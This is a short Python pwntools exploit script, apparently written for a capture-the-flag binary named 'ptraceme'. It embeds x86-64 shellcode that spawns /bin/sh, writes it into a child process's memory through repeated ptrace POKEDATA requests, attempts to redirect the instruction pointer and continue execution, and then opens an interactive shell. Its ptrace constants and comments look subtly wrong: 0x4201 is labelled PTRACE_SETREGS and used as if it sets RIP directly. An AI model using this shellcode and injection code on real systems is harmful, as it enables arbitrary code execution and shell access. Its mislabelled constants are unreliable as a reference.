from pwn import *

# Shellcode to execute /bin/sh
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# Writable memory address in the child process (replace with actual address)
payload_addr = 0x7fffffffdc20  # Example address

def ptrace_call(remote, req, addr, data):
    """Send a ptrace request via the menu-based interface."""
    remote.sendline("1")  # Select the ptrace menu option
    remote.sendline(str(req))  # Request type (e.g., PTRACE_POKEDATA)
    remote.sendline(str(addr))  # Address
    remote.sendline(str(data))  # Data
    remote.recvuntil("Value: ")  # Parse output
    value = int(remote.recvline().strip(), 16)
    return value

def write_mem(remote, addr, buffer):
    """Write data into the child process's memory."""
    word_size = 8  # 64-bit architecture
    for i in range(0, len(buffer), word_size):
        chunk = buffer[i:i + word_size]
        chunk += b"\x00" * (word_size - len(chunk))  # Pad with null bytes
        data = int.from_bytes(chunk, byteorder='little')
        ptrace_call(remote, 4, addr + i, data)  # PTRACE_POKEDATA is 4

def main():
    # Connect to the challenge
    remote = process('./ptraceme')


    # Inject the shellcode into the child process
    log.info(f"Injecting payload at address: 0x{payload_addr:x}")
    write_mem(remote, payload_addr, payload)

    # Modify RIP to point to the payload
    log.info("Setting RIP to the payload address")
    ptrace_call(remote, 0x4201, payload_addr, 0)  # PTRACE_SETREGS is 0x4201

    # Resume the child process
    log.info("Resuming execution...")
    ptrace_call(remote, 7, 0, 0)  # PTRACE_CONT is 7

    # Drop into an interactive shell
    log.success("Payload executed. Check for shell access.")
    remote.interactive()

if __name__ == "__main__":
    main()
